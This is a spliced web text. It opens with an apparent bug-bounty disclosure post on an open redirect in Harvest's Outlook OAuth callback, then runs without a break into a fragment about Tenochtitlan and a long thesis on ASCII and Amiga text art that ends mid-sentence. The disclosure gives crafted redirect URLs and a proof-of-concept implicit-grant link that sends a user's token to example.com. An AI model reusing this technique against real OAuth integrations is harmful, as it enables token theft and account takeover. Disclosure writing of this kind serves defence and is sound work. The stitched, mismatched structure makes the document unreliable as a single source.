<p>The bare open redirect which led to the token leak was found after a successful connection to Outlook calendar using OAuth application located at <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a>. The link was:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22hackerone295%22%7d
</span></code></pre>
<p><code>state</code> parameter in the above URL is a JSON object URI encoded:</p>
<pre data-lang="json"><code data-lang="json"><span>{"</span><span>return_to</span><span>":"</span><span>/</span><span>","</span><span>subdomain</span><span>":"</span><span>hackerone295</span><span>"}
</span></code></pre>
<p>The subdomain parameter is used to guess the main space of the Harvest app ie. <a href="http://hackerone295.harvestapp.com/">hackerone295.harvestapp.com</a> in the above case. Appending a forward slash to the <code>subdomain</code> parameter leads to open redirect:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22example.com/%22%7d
</span></code></pre>
<p>Since the url <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> is set as a redirection URL within the OAuth application, the open redirection can be used to steal the access token.</p>
<p>Combining the open redirect with implicit grant flow leaks the access tokens to the redirected URL. Implicit grant flow can be crafted as follows:</p>
<pre><code><span>https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
</span><span>client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token
</span><span>&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22localhost/%22%7d
</span><span>&amp;scope=openid
</span><span>&amp;response_mode=fragment
</span><span>&amp;state=1
</span><span>&amp;nonce=123456
</span></code></pre>
<p>The <code>redirect_uri</code> in the above link is the open redirect link. The <code>client_id</code> is the id of OAuth Application accessible via <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a></p>
<p>POC URL: <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456">https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456</a></p>
<p>The user is redirected to:</p>
<pre><code><span>https://example.com/.harvestapp.com/auth/outlook-calendar/callback?state=%7B%22return_to%22%3A%22%2Ftime%22%2C%22subdomain%22%3A%22example.com%2F%22%7D#id_token=[your access token]&amp;state=1
</span></code></pre>
<h2 id="disclosure-timeline">Disclosure timeline</h2>
<p>In the process of disclosing and patching this vulnerability, the Harvest team was barely responsive. The company acknowledged the vulnerability by triaging but took a very long time to fix the vulnerability. After 3 years of reporting, the company finally fixed the vulnerability silently and didn't bother to inform. On 1st August 2023, I tested the vulnerability again and found it fixed. The report is still marked as triage as of 21 October 2023, and their bug bounty policy mentions rewards but no bounty or even HackerOne points were rewarded by the company. According to their HackerOne page, their average time to triage was 8 days (in 2020) but now it is nil. Hence, finally disclosing this publicly.</p>
<ul>
<li>Aug 23rd, 2020 - Reported vulnerability</li>
<li>Oct 16th, 2020 - First contact by Harvest</li>
<li>Nov 27th, 2020 - The report was triaged</li>
<li>Apr 28th, 2022 - The company said they are in the process of fixing it and gave an ETA of 2 weeks but it took them another year to fix it.</li>
<li>Aug 1st, 2023 - The vulnerability was confirmed as patched.</li>
<li>Oct 21st, 2023 - Publicly disclosed the report via this blog post.</li>

            The year is 1518. Mexico-Tenochtitlan, once an unassuming settlement in the middle of Lake Texcoco, now a bustling metropolis. It is the capital of an empire ruling over, and receiving tribute from, more than 5 million people. Tenochtitlan is home to 200.000 farmers, artisans, merchants, soldiers, priests and aristocrats. At this time, it is one of the largest cities in the world.</p><p>Today, we call this city Ciudad de Mexico - Mexico City.</p><p>Not much is left of the old Aztec - or <i>Mexica</i> - capital Tenochtitlan. What did this city, raised from the lake bed by hand, look like? Using historical and archeological sources, and the expertise of many, I have tried to faithfully bring this iconic city to life.

By combining these three symbols in sequence, you get :-). When you tilt this combination ninety degrees clockwise in your mind, it can be interpreted as a smiling face, an emoticon, with eyes, nose, and mouth. Originally, these symbols were created for the structures of written language, but in daily human communication, these symbols and their combinations have been given a new added meaning and purpose. Images created with letter characters enhance the expressiveness of text-based presentations, such as emails or text messages.</p><p>In text-based communication, the representation of images has not always been possible for technical reasons. To address this need, text art emerged, a technique of creating images where a picture or word is formed from drawn or printed symbols in a composition. An emoticon is a kind of simple image formed with letter characters. However, by combining various letter characters spread over several lines, it's possible to create much more nuanced images that can depict almost any subject. This image-making technique has been a part of the history of writing up to the present day. I will discuss this matter in more detail in section <a href="#222-history-of-text-art">2.2.2.</a></p><p>Text art made on a computer is usually called ASCII art. The name derives from the character standard developed in the 1960s. ASCII art flourished in the 1980s and 1990s, before the internet, when text-based BBS systems operating on telephone networks served as the primary places for thought and information exchange, much like the internet. The making of ASCII art waned as the internet displaced BBS systems with the advent of fast broadband connections around the year 2000. However, ASCII art has surged in recent years due to nostalgia, social media, and the archiving of ASCII art.</p><p>In my thesis, I delve into this image-making technique and use it as a method to develop my visual expression. In the research sections, I define text art as one genre of visual art, encompassing ASCII art and its sub-genres, and briefly describe the history of text art and ASCII art and the associated subculture. I focus especially on the Amiga-style ASCII text art in my thesis and create a collection of my experiments using this image-making method. I elaborate on the aforementioned concepts in section <a href="#23-the-era-of-ascii-art">2.3</a>.</p><hr><h2 id="research-section">RESEARCH SECTION</h2><h2 id="21-source-materials-and-research-data">2.1. SOURCE MATERIALS AND RESEARCH DATA</h2><p>Historically, the typewriter as a medium of creative expression has largely been overlooked, perhaps because those who created typewriter art were primarily professional typists who demonstrated their skills mainly to peers in the same field. Many early typewriter artists were likely unaware of the historical background and significance of their art, leading to a lack of its widespread recognition and acceptance by critics. Those who were interested in the typewriter as a medium for text art were mainly intrigued by it from the perspective of concrete poetry, rather than viewing it from a visual art perspective. This has resulted in a lack of complete understanding of the entire field of text art. Only now, due to the archiving capabilities of the Internet and the exposure of text art, is a more comprehensive picture emerging.<sup><a href="#fn1" id="fnref1">[1]</a></sup></p><p>This same trend seems to be occurring with ASCII text art, leading to a perceived lack of quality source material on text art or ASCII art. Two anthologies have been written on typewriter art: Alan Riddell's <em>Typewriter Art</em> (1975) and Barrie Tullett's <em>Typewriter Art: A Modern Anthology</em> (2014). Only one significant retrospective has been held on typewriter art (London and Edinburgh 1973, 1974)<sup><a href="#fn2" id="fnref2">[2]</a></sup>. Not a single extensive publication or study has been written on ASCII art, and only one small exhibition was held in Cologne in 2013 as part of an electronic art festival. The subject has been briefly touched upon in a few studies dealing with computer enthusiast subcultures, such as the 2011 study <em>Like City Lights, Receding: ANSi Artwork and the Digital Underground, 1985-2000</em> by Canadian Michael Hargadon. Most studies focus on computer enthusiast subcultures and related phenomena mainly from a technical, sociological, or historical perspective.</p><p>For my research, I interviewed two individuals who are still actively involved in the Amiga ASCII scene. I interviewed Amiga ASCII pioneer, German Michael "Skin" Hischer, via email. Additionally, I interviewed Finnish Amiga ASCII artist Antti "h7" Kiuru. The interviews mainly focused on questions about the process of creating ASCII art, their style, sources of inspiration, and personal history. I also posed a few general questions in the Facebook group "Ansi, Ascii artists worldwide!" which includes a large portion of individuals involved in the subculture.</p><p>As written sources, I utilized several studies dealing with computer enthusiast subcultures and related phenomena, numerous internet sources, and Barrie Tullett's work on typewriter art, <em>Typewriter Art: A Modern Anthology</em>. From these pieces, I believe I was able to create a comprehensive yet source-critical understanding and description of the subject matter under investigation.</p><h2 id="22-about-text-art">2.2. ABOUT TEXT ART</h2><h3 id="221-definition-of-text-art">2.2.1. DEFINITION OF TEXT ART</h3><p>While working on this thesis, there didn't seem to be a definition of text art available anywhere. This is probably due to the almost complete absence of both Finnish and English literature or research on text art. Just the fact that the English Wikipedia article for "text art"<sup><a href="#fn3" id="fnref3">[3]</a></sup> redirects to a vague and sparse article on ASCII art indicates the scarcity of research and that the history of text art has not been fully understood internationally. However, to address my research topic, I need to define text art in some way.</p><p>When I started to develop a definition of text art, the difference in the use of a letter character in written language and in text art seemed to be a defining factor. What is the significance of a letter in text art? What's the difference between a letter character in written language and in text art?</p><p>Text is a semantic unit. In text, the form isn't as important as the meaning given by the forms<sup><a href="#fn4" id="fnref4">[4]</a></sup>. Written text consists of graphemes, i.e., written characters. Grapheme refers to letters, that is, characters used in a phonetic writing system, and other writable characters such as numbers and punctuation marks<sup><a href="#fn5" id="fnref5">[5]</a></sup>. In written language, text and letters contain meanings; they are a tool for communication.</p><p>In the context of text art, a character is considered solely through its form. In text art, a letter is not symbolic and does not have semantic meaning, but the composition of letter characters creates an image, which in itself can symbolize something. The semantic meaning of the image arises from the form given by the composition of the letter characters, that is, what the image resembles, unlike in written language where combinations of letter characters, words, and sentences mean something, carry meaning. Thus, one can think that the word "ball" immediately brings to mind an object made of some material, while in the context of text art, a ball can be symbolized by, for example, the letter O, in which case just the shape of the letter can bring to mind an object made of material.</p><p>Text art can therefore be defined as follows: <strong>text art is a form of art in which a composition of letter characters forms a two-dimensional representation, that is, an image</strong>.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This definition is not satisfactory.</p><p>First of all, there are forms of text art where characters can have be both: semantic (where the character is a part of a word) and non-semantic (where the same character is part of an typographical picture) meanings. This is quite common in shaped or visual poetry.</p><p>Secondly — where the attempt at a universal definition of text art gets really complicated — it's possible that the whole picture consists of no letters at all. An example is of course ANSI art, where the pictures usually consist of only block elements █, ▓, ▒, and ░.</p><p>A possible, more broad, but also more straightforward, definition of text art could be: <strong>pictorial images created from type elements</strong>. (I don't suggest that to be the definitive definition, because it doesn't quite capture the essence of more calligraphic forms of text art.)</p><p>Broadly, text art can be divided into 3 categories: calligraphic, mechanical and digital.</p><p>Calligraphic text is hand drawn, it includes but is not limited to these sub-genres: calligrammes, calligraphic pictures, zoomorphic calligraphy, various shaped or pattern poetry (carmina figurata, grid poem, imago poem, spatial line poem), micro-calligraphy (or microgrammy), some asemic writing and pictorial islamic calligraphy.</p><p>Mechanical text art is usually done with either letterpress or typewriter. That includes subgenres such as: type pictures / typipictures (US), art-printing, letter-pictures, pictorial typography, ruled paintings / picture, imagotipo/imagotipia (Venezuela), Koppermandaag prenten (The Netherlands), Bildsatz, Ornamententypensatz, Typensatz (Germany), Stigmatypie (Austria), stigmatypy (US), typometry / typometrie, typotecture and typewriter art (including concerte poetry and other visual poetry).</p><p>Digital text art includes various textmode art such as 7-bit and 8-bit ASCII art, PETSCII, ATASCII, PC-ASCII (filled ASCII), ANSI art, Amiga ASCII, Shift_JIS, Unicode art, Taiwanese ANSI and others. Non-textmode text art includes newer and more varied styles, but they are too numerous to include here. Check Carlsson's overview and Polyduck's <a href="https://polyducks.co.uk/pages/what-is-textmode/">What is Textmode?</a> for more.</p><p>(I should write a more comprehensive overview especially of the mechanical ones at some point...)</p></div><h2 id="222-history-of-text-art">2.2.2. HISTORY OF TEXT ART</h2><p>Before the invention of typewriters and computers, calligram was the most common form of text art. A calligram is a poem, phrase, or word in which the text or words are arranged so that they collectively form a picture. The picture formed in the calligram is usually visually related to the words or word used in it and expresses the theme of the poem. One of the first calligrams is <em>Axe</em> by Simmias of Rhodes, made in 325 BC, where the text forms an image of an axe (Figure 2). A Jewish tradition of micro-calligraphy also resembles calligrams, where small written Hebrew letters form geometric and abstract images<sup><a href="#fn6" id="fnref6">[6]</a></sup>.</p><figure><img alt="A manuscript page of 3 poems shaped like an axe, wings and a vase" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/XAbta85DYP-700.jpeg" width="700" height="396"><figcaption>(Figure 2.) Axe of Simmias of Rhodes, 325 BCE</figcaption></figure><p>Arabic calligraphy can also be considered a form of text art. Drawing humans is seen in Islam as idol worship, so picyutrd were drawn using calligraphy, that is, text. In Islamic culture, calligraphy is considered the noblest form of visual art, as it translates the words of God as revealed in the Qur'an into a visible form. Qur'anic manuscripts have always been commissioned from the most skilled calligraphers to give the text an artistic appearance worthy of its value <sup><a href="#fn7" id="fnref7">[7]</a></sup>.</p><p>Movable type and printing press developed in the 1400s made duplicating knowledge fast and, above all, cheap. The printing technique made it possible to shape people's perceptions of themselves and the surrounding world. The great revolution of printing in Europe was the invention of movable type, which meant that the same type could be used over and over again to produce many different printed products. Movable types significantly accelerated page production compared to engraving each page separately on wood or metal plates, so movable types were also used to create typographic ornaments and pictures <sup><a href="#fn8" id="fnref8">[8]</a></sup>.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This is my current focus of study and I hope to write more about the history of pictorial typography with movable type soon™!</p></div><p>Just as the printing press once did, the typewriter revolutionized the world. By the end of the 1800s, it had established its position not only in the industrial and commercial sectors but also in the cultural and social fields. Typewriter created new professions and livelihoods and was also a crucial step towards women's emancipation. It also gave people the means to communicate freely without fear of censorship and enabled writers to write as quickly as they thought. The typewriter brought a modern way of directly presenting and disseminating thoughts<sup><a href="#fn9" id="fnref9">[9]</a></sup>. It also became a tool for making art.</p><figure><img alt="Typewritten drawing of a butterfly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/sQHzWW2fiz-600.jpeg" width="600" height="901"><figcaption>(Figure 3.) Flora Stacey's butterfly (1898)</figcaption></figure><p>One of the first surviving images made with a typewriter is a picture of a butterfly made by Flora Stacey, who worked as a secretary, in 1898<sup><a href="#fn10" id="fnref10">[10]</a></sup> (Figure 3). By re-entering the same paper at different angles and stacking letters, almost any shape could be created, and Stacey's picture is more reminiscent of pencil drawing than typical mosaic-like text art. On the other hand, a few years earlier, the publication <em>Pitman’s Typewriter Manual</em> (1893) better utilized the limitations and possibilities set by the typewriter and is more reminiscent of modern ASCII art than Stacey's butterfly (Figure 4).</p><figure><img alt="Various patterns, letters and characters made with a typewriter" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/xaTljLkg-F-590.jpeg" width="590" height="824"><figcaption>(Figure 4.) Pitman’s Typewriter Manual (1893)</figcaption></figure><p>However, text art made with a typewriter can be seen to have flourished mainly in the 50s–70s. Around the same time in the 1950s, concrete poetry was born in different parts of the world, where the typewriter was used as a tool to create visual poems with the typographic layout of words being crucial to the impression. In concrete poetry, seeing and reading play an equally significant role<sup><a href="#fn11" id="fnref11">[11]</a></sup>. Artists and poets who used this method were interested in how printed words can be interpreted through their presentation and design. They sought ways to create new meanings and conceptual levels for the text by visually composing it<sup><a href="#fn12" id="fnref12">[12]</a></sup>.</p><p>At the same time, written messages were transmitted over radio links using teletype machines. Using a sound reminiscent of Morse code, the machine could remotely control another similar teletype machine, with messages printed on paper through a printer. What was written on paper at one end was automatically written on paper at the other end. To standardize the character graphics for teletypes, the 5-bit Baudot code was developed, which can be considered a precursor to the ASCII character system. Text art created with teletype machines was exchanged among other radio amateurs, and these works are very reminiscent of future ASCII art <sup><a href="#fn13" id="fnref13">[13]</a></sup> (Figure 5).</p><figure><img alt="The last supper rendered with text" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/Nlo5l3x-sh-640.jpeg" width="640" height="479"><figcaption>(Figure 5.) Teletype art.</figcaption></figure><p>The development of different forms of text art does not seem to be linear but appears to have occurred independently following each paradigm shift in information technology. They are fascinating examples of how technology has been used as a tool to create works far from what the technology developers could have imagined they would create. The pioneers of text art seem to have been primarily those who were not primarily artistically oriented but were interested in technology and its limitations.</p><p>The first step in the emergence of computer-made text art, called ASCII art, occurred with the change in Western consumption paradigm brought about by the microcomputer revolution in the late 1970s. How did this paradigm shift occur, and what followed? What steps led to the birth of ASCII art? I will discuss these issues in the next chapter.</p><h2 id="23-the-age-of-ascii-art">2.3. THE AGE OF ASCII ART</h2><h3 id="231-a-history-of-home-computers">2.3.1. A HISTORY OF HOME COMPUTERS</h3><p>At its core, computers are intricate calculators, adept at computing mathematical functions swiftly and processing vast amounts of data. Until the late '70s, these calculations and data processing were performed on large mainframes – the first-generation computers situated in glass-walled computer rooms. These were primarily used as instruments of centralized power within hierarchical organizations to manage large and complex commercial-administrative systems. This gave birth to an industry where IBM played a dominant role. These mainframes were only accessible to entities with significant capital, such as the defense industry, large corporations, and universities. Their operation required expertise in both hardware and software<sup><a href="#fn14" id="fnref14">[14]</a></sup>.</p><p>By the late '70s, foundational computer components, transistors, and microprocessors, had been miniaturized enough to allow for the creation of reasonably sized second-generation microcomputers. In essence, microcomputers did not differ from mainframes except in size, price, availability, and complexity<sup><a href="#fn15" id="fnref15">[15]</a></sup>.</p><p>However, the technology revolution didn't stem merely from technological achievements, but from the evolution of factories that produced components. As these components were miniaturized, their production costs reduced, and manufacturing energy efficiency and volumes increased. This allowed for mass production of computers. Yet, by the mid-'70s, a typical microcomputer user needed skills like soldering components, constructing keyboards, interfacing devices, and programming both the system and applications. Computers transitioned from computer rooms to design offices and labs, inadvertently giving rise to the hacker culture. A new wave of enterprises emerged in the IT sector, leading innovations and developing consumer-friendly applications and devices<sup><a href="#fn16" id="fnref16">[16]</a></sup>.</p><p>By the late '70s, new companies emerged that sold pre-assembled computers. Apple was one of these, with its Apple II in 1977 being the first massively successful mass-produced microcomputer. In a May 1977 article for <em>Byte</em> magazine, Apple's Steve Wozniak wrote,</p><blockquote><p>“I think a personal computer should be small, reliable, convenient to use, and inexpensive”<sup><a href="#fn17" id="fnref17">[17]</a></sup>.</p></blockquote><p>No longer did computer users need to be IT experts or hobbyists, but could simply be the "ordinary consumer".</p><p>The third generation, or personal computers, in the 1980s, transitioned IT from the hands of engineers to a broader user base who began applying it for tasks like word processing and spreadsheet calculations. By the '80s, the market had been flooded by several small, medium, and large companies offering various solutions. By 1983, however, the market was predominantly dominated by systems from three computer manufacturers: Apple Computer's <em>Apple II</em>, Commodore International's <em>Commodore 64</em> (and later <em>Amiga</em>), and IBM's <em>PC</em>. Each catered to slightly different consumer bases based on price and technical features. Apple computers were mostly sold to users wanting a mix of games and utility programs, Commodore dominated the gaming market because of its affordability and superior graphics and sound capabilities, and IBM rapidly secured a monopoly in the corporate IT world.</p><p>In the 1980s competition, IBM established the dominant standard for personal computers (IBM PC-compatible computers), but lost its exclusive rights to manufacture machines following its standard. By the end of the '80s, 80% of all sold microcomputers were either IBM-made or at least used its system. However, by the early '90s, the mantle had shifted to the Intel-Microsoft duo, whose actions reshaped the entire industry. Intel was responsible for processors, and Microsoft took care of the operating system<sup><a href="#fn18" id="fnref18">[18]</a></sup>.</p><p>Still, Amigas were popular in the early '90s and became significant among computer enthusiasts. They were more prevalent in Europe than in America, which influenced the strong Amiga culture in Europe. For instance, according to a reader survey conducted by <em>MikroBitti</em> magazine, 49% of its Finnish readers owned an Amiga, while 27% owned a PC, at the turn of 1991–1992<sup><a href="#fn19" id="fnref19">[19]</a></sup>.</p><p>However, Amiga's share of the home computer market declined sharply in subsequent years as PCs overtook them in terms of price-to-quality ratio. Commodore couldn't counteract IBM PC's and its clones' rise with their Amiga. Though initially ahead in terms of value, by 1992, it became challenging to produce cost-competitive technology against the ballooning PC industry<sup><a href="#fn20" id="fnref20">[20]</a></sup>.</p><p>In May 1994, Commodore filed for voluntary bankruptcy. However, the unwavering loyalty of some Amiga users ensured that the Amiga hobby and scene continued, even if new devices were no longer sold. By the mid-'90s, PCs had become the standard home computer in Europe, with no serious challengers in sight.<sup><a href="#fn21" id="fnref21">[21]</a></sup> Gradually, computers became a household item in Western countries.</p><p>Brushes and parchment, the printing press, teletype, and typewriters each enriched text-based communication in their time. Similarly, the most crucial factor of the computer revolution was the democratization of information as the computer became a consumer product<sup><a href="#fn22" id="fnref22">[22]</a></sup>. In the following subsections, I will discuss the evolution of computer writing systems and the emergence of different forms of ASCII art with these devices and systems.</p><h3 id="232-what-is-ascii-art">2.3.2. WHAT IS ASCII ART?</h3><p>In the 1960s, to facilitate the transfer of text-form information across various systems and devices, the ASCII character set standard was developed (an acronym for <em>American Standard Code for Information Interchange</em>)<sup><a href="#fn23" id="fnref23">[23]</a></sup>. In information technology, a character set is an agreement defining how binary numbers represented as bit combinations should be interpreted as characters belonging to a writing system. A computer can correctly process only those characters included in its known character set. ASCII is a 7-bit character set, covering 128 (2⁷) character positions, and primarily encompasses the letters, numbers, punctuation, and special characters, as well as certain control codes, required for American English<sup><a href="#fn24" id="fnref24">[24]</a></sup>.</p><figure><img alt="A list of characters in ASCII" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/06J-fhZapl-1092.png" width="1092" height="270"><figcaption>(Figure 6.) Printable letters and symbols from the ASCII character set.</figcaption></figure><p>Since computers typically use 8-bit bytes and ASCII is 7-bit, many computer manufacturers developed broader character sets where the spare bit was utilized. This doubled the number of characters from 128 to 256 (2⁸). In these character sets, the first 128 characters typically matched ASCII, but the remaining positions could be devoted, for example, to letters of other languages or characters reserved for table graphics. As a result, the extended character sets of different computer manufacturers could vary considerably<sup><a href="#fn25" id="fnref25">[25]</a></sup>.</p><p>ASCII remained the most commonly used character set on the Internet until 2007 when it was overtaken by the UTF-8, based on the Unicode standard, comprising over 110,000 characters<sup><a href="#fn26" id="fnref26">[26]</a></sup>.</p><p>Artwork created with the ASCII character set is referred to as ASCII art. However, the term "ASCII art" has become an umbrella term for all types of images formed from computer-assisted characters. This is somewhat misleading, as ASCII refers to the original 7-bit, 128-character position character set. Most ASCII art, however, is crafted using extended 8-bit or higher character sets. The most renowned forms of ASCII art are 7-bit ASCII art, ANSI art, Amiga ASCII, ATASCII, PETSCII, Shift_JIS, teletext, and Unicode art. Each employs a distinct character set and often a specific font to craft the images<sup><a href="#fn27" id="fnref27">[27]</a></sup>.</p><p>Most ASCII art is crafted using a computer's text-based system (known as "textmode"), which consists of a grid built from identically sized cells. Each cell can contain one character. Characters employ a monospaced font, with each character occupying equal space, thus each row can contain an equal number of characters. The number of characters per row depends on the system and application in use. For instance, IBM PCs employed an 80x25 grid for displaying text, with a maximum of 25 rows, each having 80 cells. Current text processing predominantly supports variable-width fonts, which weren't viable in textmode. ASCII art made in textmode can thus be described as a kind of mosaic, where typographical symbols are precisely arranged on a grid to form an image<sup><a href="#fn28" id="fnref28">[28]</a></sup>.</p><p>One of the earliest images reminiscent of ASCII art was created by Kenneth Knowlton and Leon Harmon, both of whom worked at Bell Labs. The image was a mosaic of a nude, comprised of symbols used in electronic circuit diagrams<sup><a href="#fn29" id="fnref29">[29]</a></sup>: (Figure 7).</p><figure><img alt="A black and white image of reclaining nude body, comprised of symbols used in electronic circuit diagrams" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/hgult1_0qR-2000.jpeg" width="2000" height="853"><figcaption>(Figure 7.) Harmon-Knowlton nude.</figcaption></figure><blockquote><p>"The nonscientific, some say artistic, aspects of computer graphics arose for me via a sophomoric prank. Ed David, two levels up, was away for while and the mice, one might say, played ever more freely. Leon Harmon stopped by to ask me for help with a brilliant idea: when Ed returns, one entire wall of his office will be covered with a huge picture made of small electronic symbols for transistors, resistors and such. But overall, they will form a somewhat-hard-to-see picture of, guess what, a nude! And so the renowned Harmon-Knowlton nude was conceived, coaxed into being, and duly hung on Ed's wall."<sup><a href="#fn30" id="fnref30">[30]</a></sup>.</p></blockquote><p>Even though this image was swiftly removed from the office wall and rapidly dismissed by Bell Labs' PR department, it leaked to the public, ending up on the pages of The New York Times and even on display at the Museum of Modern Art in New York in an exhibition titled <em>The Machine as Seen at the End of the Mechanical Age</em>. This prank turned into a sensation in a short time, and the creation of this symbol-based mosaic was a crucial step in the evolution of computer graphics and ASCII art<sup><a href="#fn31" id="fnref31">[31]</a></sup>.</p><h3 id="233-what-is-amiga-ascii-art">2.3.3. WHAT IS AMIGA ASCII ART?</h3><p>ASCII art made with the Amiga computer's font and column settings is called Amiga ASCII.</p><p>The Amiga has its own 8-bit character set. The first 128 characters follow the ASCII standard, but the remaining 128 characters belong to Amiga's extended character set. It isn't particularly suited for drawing pictures and graphics, as it doesn't contain characters meant for drawing tables and graphics, unlike character sets of some other contemporary machines. Amiga's extended character set mainly contains some mathematical symbols and some characters of European languages, such as the letters ä, ö, and å used in Finnish.</p><figure><img alt="A list of characters in Amiga" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/WClLk5xu82-583.png" width="583" height="309"><figcaption>(Figure 6.) Printable letters and symbols from the Amiga character set.</figcaption></figure><p>What makes the Amiga particularly suitable for creating text art, however, is its default monospaced font "Topaz". Its letterforms and column settings allow for the creation of cohesive patterns. In Amiga, the line spacing and character spacing are very narrow, so certain characters "merge" if arranged correctly. For example, by typing an underscore followed immediately by a slash, it looks as if these two characters were one cohesive pattern and not two separate characters.</p><p>By combining these characters, it's possible to create pictures resembling sketches or outline drawings. This is a special feature of Amiga ASCII, distinguishing it from all other forms of ASCII art. Amiga ASCII is also called line-ASCII to differentiate it from filled-ASCII made on PCs.</p><p>Slashes and underscores are perhaps the most commonly used characters in Amiga ASCII art. These characters form the basis of many Amiga ASCII pictures. Two slashes placed one below the other form a cohesive slanting line, and two underscores in a row form a straight horizontal line. These characters can form an endless variety of shapes, which almost seamlessly connect to each other. Due to the cohesive line formed by the slash, many Amiga ASCII logos look italic or slanted.<sup><a href="#fn32" id="fnref32">[32]</a></sup></p><figure><img alt="The word foundation rendered in Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/O8X5M6sFju-397.png" width="397" height="115"><figcaption>(Figure 9.) Foundation - this word is formed using the Topaz font characters / \ and _ with Amiga's original column settings.</figcaption></figure><p>Michael Hischer, whom I interviewed, describes his technique as:</p><blockquote><p>"[The limited number of characters] has always been an opportunity and challenge for me to create something that others don't do or can't do. I never use more than ten characters when creating ASCII. An excessive number of characters would be a distraction and divert from the essentials." <sup><a href="#fn33" id="fnref33">[33]</a></sup> (Figure 10)</p></blockquote><figure><img alt="Various typographical symbols from the Amiga character set" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/-84UvNu9jk-485.png" width="485" height="34"><figcaption>(Figure 10.) Characters mainly used in the art of Michael "Skin" Hischer, a pioneer of Amiga ASCII art.</figcaption></figure><p>Amiga ASCII is part of a broader phenomenon called the demoscene. The demoscene is a computer hobbyist subculture centered around its cultural artifacts, demos. Demos are real-time audiovisual presentations executed on a computer, made especially within the demo culture, or demoscene, that emerged around the mid-1980s.<sup><a href="#fn34" id="fnref34">[34]</a></sup> The Amiga scene, on the other hand, is a subculture of the demoscene, centered on logos and other visual materials made for BBS usage and the competitive skill of text artists.<sup><a href="#fn35" id="fnref35">[35]</a></sup></p><p>Amiga ASCII art can be seen as a continuation of PETSCII art made on Commodore's earlier Commodore 64 computer. PETSCII refers to the character set of the Commodore 64, which was well-suited for text art. The technologically advanced Amiga, however, replaced the Commodore 64, and many PETSCII artists began to create text art on Amiga computers. However, the popularity of Amiga ASCII art is mainly based on the culture and social communities formed around BBS<sup><a href="#fn36" id="fnref36">[36]</a></sup>. For this reason, I will mainly focus on discussing Amiga ASCII during the BBS era, leaving out the similarities of PETSCII art to Amiga ASCII.</p><p>Nowdays Amiga ASCII is mostly created on PC, Mac or Linux computers. The only defining factor for Amiga ASCII art today seems to be the method of creating the image using the Amiga font.</p><h3 id="234-the-golden-age-of-amiga-ascii">2.3.4. THE GOLDEN AGE OF AMIGA ASCII</h3><p>A BBS (<em>Bulletin Board System</em>) refers to a computer connected to the landline network through a modem, to which its users, or BBS enthusiasts, connected with their own computer. The main focus of BBSs was primarily on various discussion areas and file sharing. Many BBSs formed tight-knit user communities and served as meeting places for various groups. BBSs can be thought of as precursors to many features familiar from today's Internet, such as social communities.<sup><a href="#fn37" id="fnref37">[37]</a></sup></p><p>The origin of BBSs began when Ward Christensen and Randy Suess (US) developed the MODEM program in 1978 mainly for data exchange within their computer club. With it, two computers could communicate and exchange files. Later that year, Christensen and Suess developed the system known as the world's first BBS called CBBS (<em>Computer Bulletin Board System</em>)<sup><a href="#fn38" id="fnref38">[38]</a></sup>.</p><figure><img alt="Amiga computer connected to a CRT showing a colorful BBS menu screen" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/-NVaxnysH8-640.jpeg" width="640" height="480"><figcaption>(Figure 11.) BBS rig on an Amiga 1200 computer.</figcaption></figure><p>Connections to the BBS were made using a modem connected to the landline network, using a character-based terminal program. Connecting cost the same as making a regular phone call. International connections were thus possible, though expensive. After calling the BBS, the user had to log into the system first. Most often, real names and sometimes also pseudonyms or handles were used in BBSs. In addition, during registration, users were often asked for name and address information and sometimes also for certain data communication settings.<sup><a href="#fn39" id="fnref39">[39]</a></sup></p><p>BBSs were navigated using keyboard commands in various menus. There were several different menu levels, usually varying according to the software the BBS used. Typically, BBSs included discussion areas, file areas, private messages, bulletins, and in some systems, it was also possible to play text-based games or chat in real-time with other users and the BBS administrator. File exchange was a significant part of BBSs, as uploading files earned usage time in the BBS.<sup><a href="#fn40" id="fnref40">[40]</a></sup></p><p>BBS activities remained for a long time within a small group interested in data communication and microcomputers. Gradually, as modem speeds increased towards the end of the 1980s, it began to spread to the awareness of larger user groups. What started primarily to facilitate mutual information exchange began to form a subculture. The age and user structure began to change, and at the same time, the ways BBSs were used diversified significantly. In the 90s, the subculture was mainly 